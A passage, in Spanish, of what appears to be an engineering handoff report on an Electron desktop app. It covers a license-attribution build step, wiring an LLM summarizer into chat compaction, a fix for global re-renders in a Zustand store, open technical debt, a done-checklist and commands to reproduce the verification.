1. **`apps/desktop/scripts/copy-avatar-attribution.cjs`** (nuevo): tras el build de electron-vite, copia el material legal al árbol emitido:
   ```
   renderer/floating/vendor/avatar/LICENSE    → out/attribution/avatar/LICENSE
   renderer/floating/vendor/avatar/LICENSE.md  → out/attribution/avatar/LICENSE.md
   renderer/floating/vendor/avatar/NOTICE     → out/attribution/avatar/NOTICE
   renderer/floating/vendor/avatar/vendor/**   → out/attribution/avatar/vendor/**
   ```
   La estructura relativa que cita `LICENSE.md` (`vendor/<familia>/…`) se conserva: el corpus queda **bajo el root del avatar**, así que las rutas citadas resuelven.

2. **`apps/desktop/package.json`**: el paso entra en el `build`:
   ```diff
   -"build": "tsc -p tsconfig.json --noEmit && electron-vite build && node scripts/verify-dist.cjs",
   +"build": "tsc -p tsconfig.json --noEmit && electron-vite build && node scripts/copy-avatar-attribution.cjs && node scripts/verify-dist.cjs",
   ```

3. **`apps/desktop/scripts/verify-dist.cjs`**: **2 checks nuevos** (el corpus está y el corpus **NO** se coló en el árbol de runtime del renderer).

**Por qué `out/attribution/` y no `out/renderer/`:** el corpus **no es código de runtime** → no debe estar en el árbol que el renderer carga ni en el typecheck. `out/attribution/` está fuera del runtime, pero `electron-builder.config.cjs` empaqueta `out/**` → **viaja dentro del ASAR** de la app instalada. (T0 pide que el corpus "no aparezca en `out/renderer/`"; T7 pide que viaje en el artefacto: `out/attribution/` cumple ambas.)

**Verificado:**
```
[copy-avatar-attribution] 3 ficheros legales + 32 del corpus → out\attribution\avatar
[verify-dist] ok: attribution/avatar/LICENSE (1068 bytes)
[verify-dist] ok: attribution/avatar/LICENSE.md (7908 bytes)
[verify-dist] ok: attribution/avatar/NOTICE (3784 bytes)
[verify-dist] TODOS LOS CHEQUEOS EN VERDE
```

---

## 10. T8 — Diff E de A2: la compactación resume con LLM

**Aplicado literal** (`handoff/A2-ola1b.md` §2.4):

```diff
-import { ModelRouter, ModelMessage, … } from "@ego/models";
+import { ModelRouter, ModelMessage, createRouterSummarizer, … } from "@ego/models";

 // bootstrap (después de `modelRouter = new ModelRouter()`)
+  // T8 (A2-ola1b, Diff E): resumidor REAL sobre el ModelRouter…
+  compactionSummarizer = createRouterSummarizer(modelRouter, { role: "fast-classifier" });

 // llamada
   const compacted = await compactionJob.compact(
     { messages: history, estimatedTokens, usageRatio },
     {
       isCompressionRebuild: true,
       sessionId,
+      ...(compactionSummarizer ? { summarizer: compactionSummarizer } : {}),
     }
   );
```

**Un ajuste sobre el diff de A2 (justificado):** A2 proponía el `summarizer` como `const` **local** a `createWindow()`, pero la llamada a `compact(...)` está en **`handleLlmStream`** (otra función, línea ~1730). Por eso el resumidor vive a **nivel de módulo** (`let compactionSummarizer: SummarizerFn | null`), se crea **después** de `modelRouter = new ModelRouter()` (necesita los proveedores registrados) y se pasa condicionalmente (si el boot no llegó a crearlo, el job usa su fallback heurístico → la compactación nunca se pierde).

**El test (TDD):** `apps/desktop/test/compaction-summarizer-wiring.test.ts` (3 tests). RED→GREEN demostrado revirtiendo el diff:

```
###### RED: sin el resumidor (Diff E revertido) ######
AssertionError: expected 'import { app, BrowserWindow, Tray, Me…' to match /summarizer:\s*compactionSummarizer/
 Test Files  1 failed | 2 passed (3)
###### GREEN: restaurado ######
 Test Files  1 passed (3)
```

> Nota: `createRouterSummarizer` **no tiene test en `packages/models/test/`** (zona de A2). Mi test en `apps/desktop/test/` lo ejercita a través de la API pública (invoca al router con el rol configurado y devuelve su texto) → cubre el comportamiento que el diff cablea.

---

## 11. Deuda de la Ola 1 que cierra esta ola (T7 del store)

### 10.1 `transition-all`: 0 en todo el renderer (verificado)

```
$ grep -rn "transition-all" apps/desktop/renderer --include=*.tsx --include=*.ts --include=*.css
(0 resultados)
```

### 10.2 El store Zustand NO provoca re-render global por delta

**Defecto (medido):** `appendToLastMessage` mutaba el último mensaje "en sitio" pero devolvía `{ messages: [...messages] }` → **un array NUEVO en cada delta**. El consumidor `ego-chat.tsx:530` se suscribe con `useChatTranscript((s) => s.messages)` → la referencia cambiaba en cada delta → `EgoChat` (cabecera, composer, árbol de assistant-ui) se re-renderizaba entero. Es exactamente el problema que T8 quería eliminar, y el comentario del propio store afirmaba lo contrario ("la identidad del array NO cambia").

**Fix:** `appendToLastMessage` muta el último mensaje **y devuelve el mismo `state`** → ni la identidad del array ni la del último mensaje cambian → los selectores por referencia no disparan re-render durante el streaming.

**Por qué es seguro:** el texto del transcript lo renderiza el store de **assistant-ui** (`ThreadPrimitive.Unstable_MessageById`), no el nuestro. El nuestro solo alimenta el **mapa de roles** (`selectRoleById`) y el **conteo** — y eso no cambia con un delta de texto. Añadir un mensaje **sí** cambia la identidad (hace falta para el mapa de roles).

**Test (TDD, RED demostrado):** `test/ChatTranscriptNoGlobalRerender.test.ts` (4 tests): (1) un delta **no** cambia la identidad del array ni la del último mensaje; (2) el texto sí se acumula; (3) añadir un mensaje **sí** cambia la identidad; (4) `selectRoleById` es estable ante un delta.

**Efecto colateral verificado:** `test/chat-transcript-store.test.ts` (el test preexistente del store) sigue en verde.

---

## 12. Deuda que queda (con dueño)

| # | Deuda | Dueño | Nota |
|---|---|---|---|
| 1 | `pnpm.overrides`: `vitest` (17 paquetes de A2 en `^2.1.2`), `tinypool` (major forzado sobre transitiva), `vitepress>vite` | A2 / A7 | §5.2 |
| 2 | `vantadb-node` → tarball en `vendor/` | **Orchestrator** → A4 → A2 → A7 | §5.3 (orden exacto) |
| 3 | Alias/paths de `@ego/avatar` en 4 ficheros de config | A4 (tras el install de A7) | §8.4 |
| 4 | `dompurify` instalada por A7; falta **unit-testear el allowlist estructural** de DOMPurify (hace falta un DOM fiel: `jsdom`) | A7 | §6.4 |
| 5 | `DESIGN.md` con los tokens OKLCH | A1 | Contenido completo en `handoff/A4.md` §3.3 (Ola 1) |
| 6 | `packages/recovery/test/chaos/hard-kill.test.ts` flaky bajo carga (pasa en aislamiento) | A2/A3 | Heredado de la Ola 1 |
| 7 | Token del MCP Server accesible desde el renderer | **Owner** | §4.4: hoy NO se expone (requisito de seguridad) |
| 8 | Decisión de producto sobre la FSM (R15) | **Owner** | §8.2: recomendé retirarla; instanciarla exige rediseñar el contrato chat↔avatar |

---

## 13. Ficheros nuevos de la Ola 1b

**Main process (mi zona):**
- `apps/desktop/src/main/mcp/secret-resolver.ts` — `SecretResolver` sobre el `CredentialManager` (T1).
- `apps/desktop/src/main/mcp/mcp-http-server.ts` — transporte HTTP streamable en loopback con bearer token (T2).
- `apps/desktop/src/main/mcp/mcp-server-runtime.ts` — arranque del `EgoMcpServer` + token persistido cifrado (T2).

**Renderer (mi zona):**
- `apps/desktop/renderer/lib/sanitize-html.ts` — sanitizador de dos capas (T3).
- `apps/desktop/renderer/components/domains/{views.tsx,domain-registry.ts,types.ts}` — las 5 vistas de dominio como componentes de registry (T4).
- `apps/desktop/renderer/components/character/state/character-state.ts` — el vocabulario de 14 estados (T5, sustituye a la FSM retirada).

**Tests (mi zona):** `test/mcp-secret-resolver.test.ts`, `test/mcp-http-server.test.ts`, `test/mcp-server-runtime.test.ts`, `test/compaction-summarizer-wiring.test.ts`, `renderer/test/MarkdownSanitization.test.tsx`, `renderer/test/DomainCanvasRegistry.test.tsx`, `renderer/test/CharacterLegacy.test.tsx`, `renderer/test/ChatTranscriptNoGlobalRerender.test.ts`.

**Eliminados:** `renderer/components/character/CharacterCanvas.tsx`, `renderer/components/character/CharacterMiniBadge.tsx`, `renderer/components/character/state/CharacterStateMachine.ts`, `test/character-state-machine.test.ts`.

**Tooling (idempotente, en `apps/desktop/scripts/`):** `t11-extract.cjs`, `t11-extract-ipc.cjs`, `t11-extract-domains.cjs`, `t11-gen-views.cjs` (descomposición de `main.ts` y de las vistas de dominio), `srgb-to-oklch.cjs` (migración de tokens T14), `copy-avatar-attribution.cjs` (**paso del build**, T7).

---

## 14. Checklist del DoD

- [x] `pnpm typecheck` (global): **exit 0** (T0 resuelto).
- [x] `pnpm lint` (global): **exit 0**.
- [x] `pnpm --filter @ego/desktop test`: **331 pasan**, 0 fallan.
- [x] `pnpm --filter @ego/renderer test`: **410 pasan**, 0 fallan.
- [x] `pnpm --filter @ego/desktop build`: exit 0 + `verify-dist.cjs` **verde** (2 checks nuevos del corpus legal).
- [x] `pnpm --filter @ego/renderer build`: exit 0.
- [x] TDD real con **RED demostrado** en T1, T3, T4, T5, T8.
- [x] Sin commits.
- [x] Sin `git checkout/reset/stash/clean`.
- [x] Sin `pnpm install`.
- [x] Escritura solo en `apps/desktop/**` (+ el handoff en `docs/agent-ops/.../handoff/A4-ola1b.md`, entregable explícito del contrato) **+ 1 cambio mínimo en `packages/integrations/src/mcp/McpManager.ts`** bajo la reasignación explícita R2 del VERDICT §4.2 ("Dueño asignado: A4"), documentado en §3.2.
- [x] No se ha tocado `packages/avatar/**`, `apps/desktop/renderer/floating/vendor/avatar/**` (A6), `docs/` (A1), `packages/{memory,knowledge,runtime,models,decision,execution,events,security}/**` (A2), ni el `package.json` raíz / `pnpm-lock.yaml` (A7).

---

## 15. Cómo reproducir la verificación

```powershell
cd "C:\Users\Eros\VantaDB Proyect\Ego"

pnpm typecheck                                   # global, exit 0
pnpm lint                                        # global, exit 0
pnpm --filter @ego/desktop test                  # 54 ficheros / 331 tests
pnpm --filter @ego/renderer exec tsc --noEmit    # exit 0

cd apps/desktop/renderer
npx vitest run --maxWorkers=3                    # 64 ficheros / 428 tests
cd ../../..

pnpm --filter @ego/desktop build                 # incluye verify-dist.cjs (verde)
pnpm --filter @ego/renderer build                # exit 0

# Corpus legal: atribución resoluble y corpus en el artefacto
node packages/avatar/scripts/check-attribution.mjs   # exit 0
Test-Path apps/desktop/out/attribution/avatar/vendor # True
```

> **Nota operativa (suite del renderer):** con el paralelismo por defecto de vitest la suite puede agotar la memoria en máquinas con poca RAM (`FATAL ERROR: AlignedAlloc Allocation failed`). Con `--maxWorkers=3` y `NODE_OPTIONS=--max-old-space-size=4096` termina en ~8 min sin fallos. No es un fallo de los tests.

> **Tests pesados (timeout explícito):** `test/ChatCanvasSplit.test.tsx` monta el `App` **completo** (2 veces en el caso de la persistencia) → ~60 s de `collect` (el `App` arrastra recharts, shiki, codemirror y assistant-ui). Le he puesto `timeout` explícito de 20 s por test (el default de vitest es 5 s y se agota bajo carga). Si el coste molesta, la alternativa es testear el `SplitPane` aislado en vez del `App` entero.

> **Trampa de la Ola 1b (ya documentada en §3.3):** los tests de `@ego/desktop` consumen el **`dist/` compilado** de los paquetes. Un cambio en `packages/**` exige `pnpm --filter <pkg> build` para verse en los tests.
